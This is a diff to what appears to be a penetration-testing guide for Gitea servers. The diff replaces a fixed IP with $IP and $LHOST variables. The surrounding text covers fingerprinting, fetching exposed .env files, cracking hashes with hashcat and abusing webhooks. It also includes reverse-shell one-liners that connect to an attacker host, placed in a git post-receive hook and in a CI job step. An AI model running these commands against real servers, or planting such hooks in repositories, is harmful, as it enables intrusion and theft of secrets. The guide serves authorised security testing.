@@ -18,15 +18,15 @@ Look for these indicators:
 - URL patterns like:
 
     ```
-    http://10.10.10.10:3000/
-    http://10.10.10.10/user/<user>
-    http://10.10.10.10/api/v1/users
+    http://$IP:3000/
+    http://$IP/user/<user>
+    http://$IP/api/v1/users
     ```
 
 #### HTTP Headers
 
 ```bash
-curl -I http://10.10.10.10:3000
+curl -I http://$IP:3000
 ```
 
 Example:
@@ -39,14 +39,14 @@ Set-Cookie: i_like_gitea=...
 #### Nmap HTTP Title Scan
 
 ```bash
-nmap -p 3000 --script http-title 10.10.10.10
+nmap -p 3000 --script http-title $IP
 ```
 
 #### Check for Docker
 
 ```bash
-curl http://10.10.10.10:3000/.env
-curl http://10.10.10.10:3000/docker-compose.yml
+curl http://$IP:3000/.env
+curl http://$IP:3000/docker-compose.yml
 ```
 
 ---
@@ -81,8 +81,8 @@ hashcat -m 10900 gitea.hashes /usr/share/wordlists/rockyou.txt --force
 #### Anonymous Access to Public Repos
 
 ```bash
-curl http://10.10.10.10:3000/<org>/<repo>/raw/branch/master/.env
-curl http://10.10.10.10:3000/<org>/<repo>/archive/master.zip
+curl http://$IP:3000/<org>/<repo>/raw/branch/master/.env
+curl http://$IP:3000/<org>/<repo>/archive/master.zip
 ```
 
 Check for:
@@ -105,7 +105,7 @@ If registration is allowed:
 Look for outbound webhook definitions in:
 
 ```
-http://10.10.10.10:3000/<org>/<repo>/settings/hooks
+http://$IP:3000/<org>/<repo>/settings/hooks
 ```
 
 You may be able to inject or redirect webhooks to attacker-controlled infrastructure for SSRF or command execution in CI/CD setups.
@@ -155,7 +155,7 @@ POST /admin/users/new
 1. Add `post-receive` or `post-commit` hook:
 
 ```bash
-echo -e '#!/bin/bash\nbash -i >& /dev/tcp/<attacker-ip>/4444 0>&1' > .git/hooks/post-receive
+echo -e '#!/bin/bash\nbash -i >& /dev/tcp/$LHOST/4444 0>&1' > .git/hooks/post-receive
 chmod +x .git/hooks/post-receive
 ```
 
@@ -172,6 +172,6 @@ jobs:
   shell:
     runs-on: ubuntu-latest
     steps:
-      - run: bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1
+      - run: bash -i >& /dev/tcp/$LHOST/4444 0>&1
 ```
 
